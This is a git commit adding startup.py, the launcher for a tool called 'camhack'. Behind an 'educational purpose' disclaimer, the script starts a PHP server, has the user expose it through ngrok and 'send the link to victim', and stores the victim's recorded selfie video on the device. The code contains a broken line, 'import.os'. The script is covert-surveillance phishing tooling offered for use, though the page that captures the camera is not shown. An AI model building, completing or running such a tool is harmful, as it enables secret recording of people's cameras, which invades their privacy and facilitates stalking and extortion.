5be5b05bafd89bb9b75f1a857e56a0b67be8292c
Karthick01234 <37922044+Karthick01234@users.noreply.github.com>
2020-04-21 13:00:22 +0530

    Add files via upload

---
+++ startup.py
@@ -0,0 +1,24 @@
+import.os
+tgreen = '\033[32m'
+print(" ")
+print( tgreen + "This tool is only for educational purpose")
+print(" ")
+print( tgreen + "Dont't use this tool for illegal activities")
+print(" ")
+os.system("cowsay camhack to hack selfie and record video")
+print(" ")
+print( tgreen + "starting php server...\n")
+print(" ")
+print( tgreen + "php server run as localhost at port address 4576")
+print(" ")
+print( tgreen + "now port forwarding through ngrok using command ./ngrok http 4576")
+print(" ")
+print( tgreen + "send the link to victim that start with https not http")
+print(" ")
+print( tgreen + "recorded video are available in /sdcard/camhack/uploads folder")
+print(" ")
+print( tgreen + "Don't delete camhack folder in your sdcard")
+print(" ")
+os.system("php -S 127.0.0.1:4576 -t /sdcard/camhack")
+
+
